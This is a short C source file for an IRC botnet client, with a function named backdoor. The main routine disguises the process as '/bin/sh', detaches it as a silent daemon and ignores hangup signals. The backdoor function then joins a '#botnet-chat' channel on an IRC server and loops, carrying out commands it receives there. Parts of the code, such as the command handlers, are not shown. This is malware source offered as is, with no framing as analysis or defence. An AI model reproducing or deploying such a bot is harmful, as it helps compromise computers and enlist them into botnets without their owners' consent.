#include "includes.h"

void backdoor()
{
	char buffer[4096];
	char hostname[20];
	gethostname(hostname, 20);
	irc_t *irc = create_irc_ctx(rand_string(50), "127.0.0.1", "6667");
	
	if( sckt_recv(irc->sockfd, buffer, sizeof(buffer)) != 0 )
		exit(1);

	if( irc_nick(irc) != 0)
		exit(1);

	if( sckt_recv(irc->sockfd, buffer, sizeof(buffer)) != 0 )
		exit(1);

	if( irc_user(irc, hostname) != 0)
		exit(1);

	if( sckt_recv(irc->sockfd, buffer, sizeof(buffer)) != 0 )
		exit(1);

	if( irc_join(irc, "#botnet-chat") != 0 )
		exit(1);

	memset(buffer, '\0', sizeof(buffer));

	while(1) 
	{
		if( sckt_recv(irc->sockfd, buffer, sizeof(buffer)) != 0 )
			exit(1);

		parse_action(buffer, strlen(buffer));
		handel_action(irc);
	}

	free(irc);
}

int main(int argc, char *argv[])
{
	strncpy(argv[0], "/bin/sh", strlen(argv[0]));
	pid_t process_id = fork();

	close(0);
	close(1);
	close(2);

	if (process_id > 0)
		exit(0);
	
	else if (process_id == 0)
	{
		
		if(setsid() < 0)
    		exit(1);

    	signal(SIGCHLD, SIG_IGN);
		signal(SIGHUP, SIG_IGN);

		umask(0);
		chdir("/");

		backdoor();
	}

	else
		exit(1);

	return 0;
}